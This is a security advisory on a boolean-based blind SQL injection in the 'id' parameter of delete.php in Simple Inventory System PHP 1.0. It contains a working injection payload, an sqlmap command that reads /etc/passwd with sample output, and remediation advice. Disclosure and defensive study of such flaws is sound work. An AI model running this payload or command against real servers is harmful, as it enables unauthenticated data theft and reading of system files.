# SQL Injection in Simple Inventory System PHP 1.0 — /InventoryManagement/delete.php

## Affected Product Details

| Field | Details |
|-------|---------|
| **Product** | Simple Inventory System In PHP |
| **Version** | 1.0 |
| **Vendor** | https://code-projects.org/simple-inventory-system-in-php-with-source-code/ |
| **Vulnerable File** | `/InventoryManagement/delete.php` |
| **Vulnerable Parameter** | `id` (GET) |
| **Authentication Required** | No |
| **Attack Vector** | Remote |
| **Vulnerability Type** | Boolean-based Blind SQL Injection |
| **CWE** | CWE-89 |
| **CVSS v3.1 Score** | 7.5 (High) |
| **CVSS v3.1 Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

## Description

A SQL Injection vulnerability was found in Simple Inventory System 1.0 on code-projects.org. The affected file is `/InventoryManagement/delete.php`. The manipulation of the GET parameter `id` with a crafted payload leads to SQL Injection (Boolean-based Blind). The application directly concatenates user input into backend SQL queries without sanitization or parameterized queries. The attack can be initiated remotely without authentication. Arbitrary file read via FILE privilege was confirmed.

## Proof of Concept

**Vulnerable Request:**
```http
GET /InventoryManagement/delete.php?id=4 HTTP/1.1
Host: TARGET
```

**Boolean-based Blind Payload:**
```
id=4 RLIKE (SELECT (CASE WHEN (5683=5683) THEN 4 ELSE 0x28 END))
```

**Arbitrary File Read via FILE Privilege:**
```bash
sqlmap -u "http://TARGET/InventoryManagement/delete.php?id=4" \
--random-agent --level 3 --risk 3 --batch \
--file-read="/etc/passwd" --threads 10

# Result: /etc/passwd successfully retrieved
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Impact

An unauthenticated remote attacker can:
- Enumerate the entire backend database
- Extract user credentials and sensitive data
- Read arbitrary files from the server via FILE privilege
- Obtain internal database schema information

## Remediation

Use parameterized queries:

```php
$stmt = $conn->prepare("DELETE FROM products WHERE id=?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

- Validate and sanitize all user input
- Restrict database user FILE privileges
- Implement least privilege principle for DB users

## References

- https://owasp.org/www-community/attacks/SQL_Injection
- https://cwe.mitre.org/data/definitions/89.html
- https://code-projects.org/simple-inventory-system-in-php-with-source-code/
